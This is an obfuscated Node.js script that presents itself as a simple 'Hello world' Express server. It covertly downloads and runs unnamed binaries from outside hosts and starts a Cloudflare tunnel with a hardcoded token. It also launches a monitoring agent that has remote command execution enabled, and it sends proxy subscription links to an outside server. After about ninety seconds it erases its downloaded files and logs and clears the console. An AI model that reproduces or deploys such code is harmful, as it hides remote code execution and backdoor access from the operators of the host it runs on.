const _0x26cd4e=_0x3e5f;(function(_0x25c610,_0x380f53){const _0x265a5c=_0x3e5f,_0x200d07=_0x25c610();while(!![]){try{const _0x5943b7=parseInt(_0x265a5c(0x205))/0x1+-parseInt(_0x265a5c(0x22e))/0x2+-parseInt(_0x265a5c(0x1c5))/0x3*(-parseInt(_0x265a5c(0x215))/0x4)+parseInt(_0x265a5c(0x1f2))/0x5+-parseInt(_0x265a5c(0x247))/0x6+-parseInt(_0x265a5c(0x1bb))/0x7+parseInt(_0x265a5c(0x1e4))/0x8*(parseInt(_0x265a5c(0x1d4))/0x9);if(_0x5943b7===_0x380f53)break;else _0x200d07['push'](_0x200d07['shift']());}catch(_0x44ad95){_0x200d07['push'](_0x200d07['shift']());}}}(_0x1659,0x6b586));const express=require(_0x26cd4e(0x207)),app=express(),axios=require(_0x26cd4e(0x1da)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x26cd4e(0x1af))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x26cd4e(0x221)][_0x26cd4e(0x1ea)]||'',PROJECT_URL=process[_0x26cd4e(0x221)][_0x26cd4e(0x22a)]||'',AUTO_ACCESS=process[_0x26cd4e(0x221)][_0x26cd4e(0x1fa)]||![],FILE_PATH=process[_0x26cd4e(0x221)][_0x26cd4e(0x1b1)]||_0x26cd4e(0x1ed),SUB_PATH=process[_0x26cd4e(0x221)][_0x26cd4e(0x195)]||'sub',PORT=process['env'][_0x26cd4e(0x1bc)]||process['env'][_0x26cd4e(0x1c7)]||0xbb8,UUID=process['env'][_0x26cd4e(0x1e1)]||_0x26cd4e(0x1db),NEZHA_SERVER=process[_0x26cd4e(0x221)][_0x26cd4e(0x197)]||'',NEZHA_PORT=process[_0x26cd4e(0x221)][_0x26cd4e(0x1dd)]||'',NEZHA_KEY=process[_0x26cd4e(0x221)][_0x26cd4e(0x1e5)]||'',ARGO_DOMAIN=process[_0x26cd4e(0x221)][_0x26cd4e(0x1e2)]||'uisid.asrnline.nyc.mn',ARGO_AUTH=process[_0x26cd4e(0x221)][_0x26cd4e(0x1ab)]||_0x26cd4e(0x218),ARGO_PORT=process[_0x26cd4e(0x221)][_0x26cd4e(0x242)]||0x1f41,CFIP=process['env'][_0x26cd4e(0x212)]||_0x26cd4e(0x241),CFPORT=process[_0x26cd4e(0x221)][_0x26cd4e(0x20f)]||0x1bb,NAME=process[_0x26cd4e(0x221)][_0x26cd4e(0x1f7)]||'';!fs['existsSync'](FILE_PATH)?(fs[_0x26cd4e(0x24c)](FILE_PATH),console[_0x26cd4e(0x1cf)](FILE_PATH+_0x26cd4e(0x19b))):console[_0x26cd4e(0x1cf)](FILE_PATH+_0x26cd4e(0x214));function _0x3e5f(_0x30b904,_0x3cfcea){const _0x1659a0=_0x1659();return _0x3e5f=function(_0x3e5f13,_0x551050){_0x3e5f13=_0x3e5f13-0x195;let _0x5eedd6=_0x1659a0[_0x3e5f13];return _0x5eedd6;},_0x3e5f(_0x30b904,_0x3cfcea);}function generateRandomName(){const _0x53e566=_0x26cd4e,_0x4a7a0c=_0x53e566(0x216);let _0x3b246a='';for(let _0x1cccb8=0x0;_0x1cccb8<0x6;_0x1cccb8++){_0x3b246a+=_0x4a7a0c[_0x53e566(0x1a1)](Math[_0x53e566(0x206)](Math['random']()*_0x4a7a0c[_0x53e566(0x244)]));}return _0x3b246a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x26cd4e(0x237)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x26cd4e(0x237)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x26cd4e(0x237)](FILE_PATH,_0x26cd4e(0x240)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x26cd4e(0x237)](FILE_PATH,_0x26cd4e(0x1f3)),configPath=path[_0x26cd4e(0x237)](FILE_PATH,'config.json');function deleteNodes(){const _0x5f0996=_0x26cd4e;try{if(!UPLOAD_URL)return;if(!fs[_0x5f0996(0x208)](subPath))return;let _0x69ae51;try{_0x69ae51=fs['readFileSync'](subPath,_0x5f0996(0x22d));}catch{return null;}const _0x1426da=Buffer[_0x5f0996(0x1b4)](_0x69ae51,_0x5f0996(0x1d2))['toString'](_0x5f0996(0x22d)),_0x40d94d=_0x1426da[_0x5f0996(0x23e)]('\x0a')[_0x5f0996(0x232)](_0x5a3f51=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5a3f51));if(_0x40d94d[_0x5f0996(0x244)]===0x0)return;return axios[_0x5f0996(0x20b)](UPLOAD_URL+_0x5f0996(0x1ba),JSON[_0x5f0996(0x202)]({'nodes':_0x40d94d}),{'headers':{'Content-Type':'application/json'}})[_0x5f0996(0x23b)](_0x20cc5e=>{return null;}),null;}catch(_0x17664f){return null;}}function cleanupOldFiles(){const _0x2e5e4c=_0x26cd4e;try{const _0x2d3055=fs['readdirSync'](FILE_PATH);_0x2d3055[_0x2e5e4c(0x1fb)](_0x3160bc=>{const _0x2ca3e1=_0x2e5e4c,_0xa01307=path[_0x2ca3e1(0x237)](FILE_PATH,_0x3160bc);try{const _0x3cf80a=fs[_0x2ca3e1(0x1a7)](_0xa01307);_0x3cf80a['isFile']()&&fs[_0x2ca3e1(0x1b2)](_0xa01307);}catch(_0x1ddfd2){}});}catch(_0x586e46){}}app[_0x26cd4e(0x1e3)]('/',function(_0x571367,_0xfd0757){const _0x435908=_0x26cd4e;_0xfd0757[_0x435908(0x20d)]('Hello\x20world!');});async function generateConfig(){const _0x45b2a3=_0x26cd4e,_0x5c90b5={'log':{'access':_0x45b2a3(0x196),'error':_0x45b2a3(0x196),'loglevel':_0x45b2a3(0x204)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x45b2a3(0x1b7),'settings':{'clients':[{'id':UUID,'flow':_0x45b2a3(0x21d)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x45b2a3(0x210),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x45b2a3(0x22f),'dest':0xbbc}]},'streamSettings':{'network':_0x45b2a3(0x219)}},{'port':0xbb9,'listen':_0x45b2a3(0x213),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x45b2a3(0x204)},'streamSettings':{'network':_0x45b2a3(0x219),'security':_0x45b2a3(0x204)}},{'port':0xbba,'listen':_0x45b2a3(0x213),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x45b2a3(0x204)},'streamSettings':{'network':'ws','security':_0x45b2a3(0x204),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x45b2a3(0x1e8),_0x45b2a3(0x21a),_0x45b2a3(0x230)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x45b2a3(0x213),'protocol':_0x45b2a3(0x1b9),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x45b2a3(0x1a9)}},'sniffing':{'enabled':!![],'destOverride':[_0x45b2a3(0x1e8),_0x45b2a3(0x21a),_0x45b2a3(0x230)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x45b2a3(0x213),'protocol':_0x45b2a3(0x1d9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x45b2a3(0x204),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x45b2a3(0x21a),_0x45b2a3(0x230)],'metadataOnly':![]}}],'dns':{'servers':[_0x45b2a3(0x249)]},'outbounds':[{'protocol':_0x45b2a3(0x1c1),'tag':_0x45b2a3(0x217)},{'protocol':_0x45b2a3(0x228),'tag':_0x45b2a3(0x1f0)}]};fs[_0x45b2a3(0x1f9)](path[_0x45b2a3(0x237)](FILE_PATH,_0x45b2a3(0x1ee)),JSON['stringify'](_0x5c90b5,null,0x2));}function getSystemArchitecture(){const _0x23858b=_0x26cd4e,_0x3f0fb0=os[_0x23858b(0x245)]();return _0x3f0fb0===_0x23858b(0x235)||_0x3f0fb0===_0x23858b(0x23d)||_0x3f0fb0==='aarch64'?_0x23858b(0x235):_0x23858b(0x200);}function downloadFile(_0xf6bd94,_0x2e81e4,_0x3a3b36){const _0x6d96b9=_0x26cd4e,_0x9368ca=_0xf6bd94;!fs[_0x6d96b9(0x208)](FILE_PATH)&&fs[_0x6d96b9(0x24c)](FILE_PATH,{'recursive':!![]});const _0x4bf6cf=fs[_0x6d96b9(0x1d0)](_0x9368ca);axios({'method':_0x6d96b9(0x1e3),'url':_0x2e81e4,'responseType':_0x6d96b9(0x20c)})[_0x6d96b9(0x1e0)](_0x591aaa=>{const _0x45eeec=_0x6d96b9;_0x591aaa[_0x45eeec(0x1a4)]['pipe'](_0x4bf6cf),_0x4bf6cf['on'](_0x45eeec(0x1bf),()=>{const _0x9701dc=_0x45eeec;_0x4bf6cf[_0x9701dc(0x198)](),console['log']('Download\x20'+path['basename'](_0x9368ca)+_0x9701dc(0x250)),_0x3a3b36(null,_0x9368ca);}),_0x4bf6cf['on']('error',_0x3fd21d=>{const _0x315b2f=_0x45eeec;fs[_0x315b2f(0x19d)](_0x9368ca,()=>{});const _0x549604=_0x315b2f(0x1f1)+path[_0x315b2f(0x1a6)](_0x9368ca)+_0x315b2f(0x24e)+_0x3fd21d[_0x315b2f(0x223)];console[_0x315b2f(0x209)](_0x549604),_0x3a3b36(_0x549604);});})[_0x6d96b9(0x23b)](_0x308b73=>{const _0x50b952=_0x6d96b9,_0x361d91=_0x50b952(0x1f1)+path['basename'](_0x9368ca)+_0x50b952(0x24e)+_0x308b73['message'];console[_0x50b952(0x209)](_0x361d91),_0x3a3b36(_0x361d91);});}async function downloadFilesAndRun(){const _0x2c597e=_0x26cd4e,_0x187b3c=getSystemArchitecture(),_0x4650ec=getFilesForArchitecture(_0x187b3c);if(_0x4650ec['length']===0x0){console[_0x2c597e(0x1cf)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x45894a=_0x4650ec[_0x2c597e(0x23a)](_0x738090=>{return new Promise((_0x6a6949,_0x313780)=>{const _0x2c299f=_0x3e5f;downloadFile(_0x738090[_0x2c299f(0x1c9)],_0x738090['fileUrl'],(_0x3a1e04,_0x46d73d)=>{_0x3a1e04?_0x313780(_0x3a1e04):_0x6a6949(_0x46d73d);});});});try{await Promise[_0x2c597e(0x20e)](_0x45894a);}catch(_0xcf5982){console[_0x2c597e(0x209)](_0x2c597e(0x1f4),_0xcf5982);return;}function _0x63cc38(_0x406448){const _0x37bf77=_0x2c597e,_0x25536b=0x1fd;_0x406448[_0x37bf77(0x1fb)](_0x3cdea3=>{const _0x2974e3=_0x37bf77;fs['existsSync'](_0x3cdea3)&&fs[_0x2974e3(0x224)](_0x3cdea3,_0x25536b,_0x55c24e=>{const _0x1ca34c=_0x2974e3;_0x55c24e?console['error'](_0x1ca34c(0x24f)+_0x3cdea3+':\x20'+_0x55c24e):console[_0x1ca34c(0x1cf)](_0x1ca34c(0x19c)+_0x3cdea3+':\x20'+_0x25536b[_0x1ca34c(0x1cc)](0x8));});});}const _0x17e86a=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x63cc38(_0x17e86a);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xbfa89d=NEZHA_SERVER[_0x2c597e(0x1e9)](':')?NEZHA_SERVER[_0x2c597e(0x23e)](':')[_0x2c597e(0x1b3)]():'',_0x4a266a=new Set([_0x2c597e(0x1ae),_0x2c597e(0x1ff),_0x2c597e(0x203),_0x2c597e(0x1cb),_0x2c597e(0x1bd),_0x2c597e(0x246)]),_0xa724e9=_0x4a266a[_0x2c597e(0x1ad)](_0xbfa89d)?_0x2c597e(0x1ef):'false',_0x33d036='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2c597e(0x1f6)+_0xa724e9+_0x2c597e(0x201)+UUID;fs[_0x2c597e(0x1f9)](path[_0x2c597e(0x237)](FILE_PATH,_0x2c597e(0x1f8)),_0x33d036);const _0x19e1be='nohup\x20'+phpPath+_0x2c597e(0x238)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x19e1be),console[_0x2c597e(0x1cf)](phpName+_0x2c597e(0x231)),await new Promise(_0x17f865=>setTimeout(_0x17f865,0x3e8));}catch(_0x282953){console[_0x2c597e(0x209)](_0x2c597e(0x1cd)+_0x282953);}}else{let _0x53b9ee='';const _0x4560db=[_0x2c597e(0x1ae),_0x2c597e(0x1ff),_0x2c597e(0x203),'2087',_0x2c597e(0x1bd),_0x2c597e(0x246)];_0x4560db[_0x2c597e(0x1e9)](NEZHA_PORT)&&(_0x53b9ee=_0x2c597e(0x1d6));const _0x47d743='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c597e(0x239)+NEZHA_KEY+'\x20'+_0x53b9ee+_0x2c597e(0x1a2);try{await exec(_0x47d743),console[_0x2c597e(0x1cf)](npmName+'\x20is\x20running'),await new Promise(_0x27a5d4=>setTimeout(_0x27a5d4,0x3e8));}catch(_0x4b39ab){console[_0x2c597e(0x209)]('npm\x20running\x20error:\x20'+_0x4b39ab);}}}else console[_0x2c597e(0x1cf)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x442b69=_0x2c597e(0x1b6)+webPath+_0x2c597e(0x1a0)+FILE_PATH+_0x2c597e(0x1ce);try{await exec(_0x442b69),console[_0x2c597e(0x1cf)](webName+'\x20is\x20running'),await new Promise(_0x2bbaab=>setTimeout(_0x2bbaab,0x3e8));}catch(_0x40558b){console[_0x2c597e(0x209)]('web\x20running\x20error:\x20'+_0x40558b);}if(fs[_0x2c597e(0x208)](botPath)){let _0x3c5d5a;if(ARGO_AUTH[_0x2c597e(0x225)](/^[A-Z0-9a-z=]{120,250}$/))_0x3c5d5a=_0x2c597e(0x1fc)+ARGO_AUTH;else ARGO_AUTH[_0x2c597e(0x225)](/TunnelSecret/)?_0x3c5d5a=_0x2c597e(0x222)+FILE_PATH+_0x2c597e(0x227):_0x3c5d5a=_0x2c597e(0x21b)+FILE_PATH+_0x2c597e(0x1e7)+ARGO_PORT;try{await exec(_0x2c597e(0x1b6)+botPath+'\x20'+_0x3c5d5a+_0x2c597e(0x229)),console[_0x2c597e(0x1cf)](botName+_0x2c597e(0x231)),await new Promise(_0x586703=>setTimeout(_0x586703,0x7d0));}catch(_0x263f5d){console[_0x2c597e(0x209)](_0x2c597e(0x248)+_0x263f5d);}}await new Promise(_0x40adef=>setTimeout(_0x40adef,0x1388));}function getFilesForArchitecture(_0x3a7132){const _0x5e0c87=_0x26cd4e;let _0x416795;_0x3a7132===_0x5e0c87(0x235)?_0x416795=[{'fileName':webPath,'fileUrl':_0x5e0c87(0x22c)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x416795=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x58f831=_0x3a7132===_0x5e0c87(0x235)?_0x5e0c87(0x1c8):_0x5e0c87(0x1eb);_0x416795[_0x5e0c87(0x1df)]({'fileName':npmPath,'fileUrl':_0x58f831});}else{const _0x1d070d=_0x3a7132===_0x5e0c87(0x235)?_0x5e0c87(0x220):_0x5e0c87(0x1d5);_0x416795['unshift']({'fileName':phpPath,'fileUrl':_0x1d070d});}}return _0x416795;}function argoType(){const _0x5d403c=_0x26cd4e;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x5d403c(0x20a));return;}if(ARGO_AUTH[_0x5d403c(0x1e9)]('TunnelSecret')){fs[_0x5d403c(0x1f9)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x19182d='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x5d403c(0x1dc)+path[_0x5d403c(0x237)](FILE_PATH,_0x5d403c(0x24d))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x5d403c(0x21c)+ARGO_PORT+_0x5d403c(0x1ec);fs[_0x5d403c(0x1f9)](path['join'](FILE_PATH,_0x5d403c(0x21e)),_0x19182d);}else console['log'](_0x5d403c(0x243));}argoType();async function extractDomains(){const _0x2745ed=_0x26cd4e;let _0x7595ec;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7595ec=ARGO_DOMAIN,console['log'](_0x2745ed(0x1fe),_0x7595ec),await _0x262ec9(_0x7595ec);else try{const _0x40d9de=fs[_0x2745ed(0x23f)](path[_0x2745ed(0x237)](FILE_PATH,'boot.log'),_0x2745ed(0x22d)),_0x410e9f=_0x40d9de[_0x2745ed(0x23e)]('\x0a'),_0x35b653=[];_0x410e9f[_0x2745ed(0x1fb)](_0x63f22f=>{const _0x4f1e3b=_0x2745ed,_0x419031=_0x63f22f[_0x4f1e3b(0x225)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x419031){const _0x4aa2fa=_0x419031[0x1];_0x35b653['push'](_0x4aa2fa);}});if(_0x35b653[_0x2745ed(0x244)]>0x0)_0x7595ec=_0x35b653[0x0],console['log'](_0x2745ed(0x23c),_0x7595ec),await _0x262ec9(_0x7595ec);else{console['log'](_0x2745ed(0x1be)),fs[_0x2745ed(0x1b2)](path[_0x2745ed(0x237)](FILE_PATH,_0x2745ed(0x1f3)));async function _0x154839(){const _0x296db3=_0x2745ed;try{process[_0x296db3(0x226)]===_0x296db3(0x24a)?await exec(_0x296db3(0x1d7)+botName+_0x296db3(0x21f)):await exec(_0x296db3(0x1a3)+botName[_0x296db3(0x1a1)](0x0)+']'+botName['substring'](0x1)+_0x296db3(0x24b));}catch(_0x355292){}}_0x154839(),await new Promise(_0xfac413=>setTimeout(_0xfac413,0xbb8));const _0x594312=_0x2745ed(0x21b)+FILE_PATH+_0x2745ed(0x1e7)+ARGO_PORT;try{await exec(_0x2745ed(0x1b6)+botPath+'\x20'+_0x594312+_0x2745ed(0x229)),console[_0x2745ed(0x1cf)](botName+_0x2745ed(0x231)),await new Promise(_0x3587f2=>setTimeout(_0x3587f2,0xbb8)),await extractDomains();}catch(_0x2ec8c8){console[_0x2745ed(0x209)]('Error\x20executing\x20command:\x20'+_0x2ec8c8);}}}catch(_0x5c1418){console['error'](_0x2745ed(0x199),_0x5c1418);}async function _0x262ec9(_0x336859){const _0x3347dc=_0x2745ed,_0x46cc79=execSync(_0x3347dc(0x19e),{'encoding':_0x3347dc(0x22d)}),_0x1504cd=_0x46cc79['trim'](),_0x1aeaff=NAME?NAME+'-'+_0x1504cd:_0x1504cd;return new Promise(_0x1d17e4=>{setTimeout(()=>{const _0xe070db=_0x3e5f,_0x154a79={'v':'2','ps':''+_0x1aeaff,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x336859,'path':_0xe070db(0x1de),'tls':_0xe070db(0x21a),'sni':_0x336859,'alpn':'','fp':_0xe070db(0x1a5)},_0x3866d7=_0xe070db(0x211)+UUID+'@'+CFIP+':'+CFPORT+_0xe070db(0x1d1)+_0x336859+_0xe070db(0x233)+_0x336859+_0xe070db(0x1c2)+_0x1aeaff+_0xe070db(0x1b8)+Buffer[_0xe070db(0x1b4)](JSON[_0xe070db(0x202)](_0x154a79))[_0xe070db(0x1cc)]('base64')+_0xe070db(0x1d8)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x336859+_0xe070db(0x233)+_0x336859+_0xe070db(0x1ca)+_0x1aeaff+_0xe070db(0x1c4);console[_0xe070db(0x1cf)](Buffer['from'](_0x3866d7)[_0xe070db(0x1cc)](_0xe070db(0x1d2))),fs[_0xe070db(0x1f9)](subPath,Buffer[_0xe070db(0x1b4)](_0x3866d7)[_0xe070db(0x1cc)](_0xe070db(0x1d2))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xe070db(0x1e3)]('/'+SUB_PATH,(_0x4e319e,_0x4714a9)=>{const _0x30f550=_0xe070db,_0x5aa688=Buffer[_0x30f550(0x1b4)](_0x3866d7)[_0x30f550(0x1cc)](_0x30f550(0x1d2));_0x4714a9[_0x30f550(0x1a8)](_0x30f550(0x1c0),'text/plain;\x20charset=utf-8'),_0x4714a9['send'](_0x5aa688);}),_0x1d17e4(_0x3866d7);},0x7d0);});}}async function uploadNodes(){const _0x3fd9dc=_0x26cd4e;if(UPLOAD_URL&&PROJECT_URL){const _0x33535a=PROJECT_URL+'/'+SUB_PATH,_0x43b955={'subscription':[_0x33535a]};try{const _0x318925=await axios[_0x3fd9dc(0x20b)](UPLOAD_URL+_0x3fd9dc(0x1f5),_0x43b955,{'headers':{'Content-Type':_0x3fd9dc(0x1c3)}});return _0x318925&&_0x318925[_0x3fd9dc(0x1c6)]===0xc8?(console[_0x3fd9dc(0x1cf)](_0x3fd9dc(0x1b0)),_0x318925):null;}catch(_0x3266cf){if(_0x3266cf[_0x3fd9dc(0x22b)]){if(_0x3266cf[_0x3fd9dc(0x22b)][_0x3fd9dc(0x1c6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3fd9dc(0x208)](listPath))return;const _0x129a7d=fs[_0x3fd9dc(0x23f)](listPath,_0x3fd9dc(0x22d)),_0xb152a6=_0x129a7d[_0x3fd9dc(0x23e)]('\x0a')[_0x3fd9dc(0x232)](_0x29bf29=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x29bf29));if(_0xb152a6['length']===0x0)return;const _0x3d5360=JSON[_0x3fd9dc(0x202)]({'nodes':_0xb152a6});try{const _0x23f94e=await axios[_0x3fd9dc(0x20b)](UPLOAD_URL+'/api/add-nodes',_0x3d5360,{'headers':{'Content-Type':'application/json'}});return _0x23f94e&&_0x23f94e['status']===0xc8?(console[_0x3fd9dc(0x1cf)]('Nodes\x20uploaded\x20successfully'),_0x23f94e):null;}catch(_0x15a0e0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x434981=_0x3e5f,_0xb1be8b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xb1be8b[_0x434981(0x1ac)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xb1be8b['push'](phpPath);process['platform']===_0x434981(0x24a)?exec(_0x434981(0x236)+_0xb1be8b[_0x434981(0x237)]('\x20')+'\x20>\x20nul\x202>&1',_0x54a240=>{const _0x37b769=_0x434981;console[_0x37b769(0x1b5)](),console[_0x37b769(0x1cf)](_0x37b769(0x19a)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0xb1be8b[_0x434981(0x237)]('\x20')+_0x434981(0x1d3),_0x2aea02=>{const _0x4490e4=_0x434981;console['clear'](),console[_0x4490e4(0x1cf)]('App\x20is\x20running'),console[_0x4490e4(0x1cf)](_0x4490e4(0x19f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x79ce9e=_0x26cd4e;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x45c48e=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x79ce9e(0x1cf)](_0x79ce9e(0x234)),_0x45c48e;}catch(_0x58e46a){return console['error'](_0x79ce9e(0x1fd)+_0x58e46a[_0x79ce9e(0x223)]),null;}}async function startserver(){const _0x2a8722=_0x26cd4e;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x138482){console['error'](_0x2a8722(0x1e6),_0x138482);}}startserver()[_0x26cd4e(0x23b)](_0x366ddd=>{const _0x69c51f=_0x26cd4e;console[_0x69c51f(0x209)]('Unhandled\x20error\x20in\x20startserver:',_0x366ddd);}),app[_0x26cd4e(0x1aa)](PORT,()=>console[_0x26cd4e(0x1cf)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x1659(){const _0x1dc2dd=['990694HVzuhA','/trojan-argo','quic','\x20is\x20running','filter','&fp=firefox&type=ws&host=','automatic\x20access\x20task\x20added\x20successfully','arm','del\x20/f\x20/q\x20','join','\x20-c\x20\x22','\x20-p\x20','map','catch','ArgoDomain:','arm64','split','readFileSync','sub.txt','cdns.doon.eu.org','ARGO_PORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','length','arch','2053','4824600fYWtkq','Error\x20executing\x20command:\x20','https+local://8.8.8.8/dns-query','win32','\x22\x20>\x20/dev/null\x202>&1','mkdirSync','tunnel.json','\x20failed:\x20','Empowerment\x20failed\x20for\x20','\x20successfully','SUB_PATH','/dev/null','NEZHA_SERVER','close','Error\x20reading\x20boot.log:','App\x20is\x20running','\x20is\x20created','Empowerment\x20success\x20for\x20','unlink','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20-c\x20','charAt','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','pkill\x20-f\x20\x22[','data','firefox','basename','statSync','set','/vmess-argo','listen','ARGO_AUTH','push','has','443','child_process','Subscription\x20uploaded\x20successfully','FILE_PATH','unlinkSync','pop','from','clear','nohup\x20','vless','\x0a\x20\x20\x0avmess://','vmess','/api/delete-nodes','1133762PGBAHr','SERVER_PORT','2083','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','finish','Content-Type','freedom','&path=%2Fvless-argo%3Fed%3D2560#','application/json','\x0a\x20\x20\x20\x20','192UgpVGh','status','PORT','https://arm64.ssss.nyc.mn/agent','fileName','&path=%2Ftrojan-argo%3Fed%3D2560#','2087','toString','php\x20running\x20error:\x20','/config.json\x20>/dev/null\x202>&1\x20&','log','createWriteStream','?encryption=none&security=tls&sni=','base64','\x20>/dev/null\x202>&1','9PRmNkt','https://amd64.ssss.nyc.mn/v1','--tls','taskkill\x20/f\x20/im\x20','\x0a\x20\x20\x0atrojan://','trojan','axios','b01d0c64-5199-4c40-a3b1-d846a624048a','\x0a\x20\x20credentials-file:\x20','NEZHA_PORT','/vmess-argo?ed=2560','unshift','then','UUID','ARGO_DOMAIN','get','6122504TouZSG','NEZHA_KEY','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','http','includes','UPLOAD_URL','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','./tmp','config.json','true','block','Download\x20','1047755vnzDHa','boot.log','Error\x20downloading\x20files:','/api/add-subscriptions','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NAME','config.yaml','writeFileSync','AUTO_ACCESS','forEach','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','ARGO_DOMAIN:','8443','amd','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','stringify','2096','none','226267sIORCf','floor','express','existsSync','error','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','post','stream','send','all','CFPORT','/vless-argo','\x0avless://','CFIP','127.0.0.1','\x20already\x20exists','43748JmGEyh','abcdefghijklmnopqrstuvwxyz','direct','eyJhIjoiM2UyMDY1YzQ1MWUwMjUwNTNlOGEwMDdmMmVhMTc4YmMiLCJ0IjoiZTA1MDE5YjMtODY1Zi00MzA1LTg4ZTAtYjU2YzgxNGU3NDBkIiwicyI6Ik1XWTBOMlJsWm1VdFpqVTBPQzAwTm1NMExUZzVNbVV0Tm1NNE1ETTRPVE0zT0dJdyJ9','tcp','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','xtls-rprx-vision','tunnel.yml','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/v1','env','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','message','chmod','match','platform','/tunnel.yml\x20run','blackhole','\x20>/dev/null\x202>&1\x20&','PROJECT_URL','response','https://arm64.ssss.nyc.mn/web','utf-8'];_0x1659=function(){return _0x1dc2dd;};return _0x1659();}
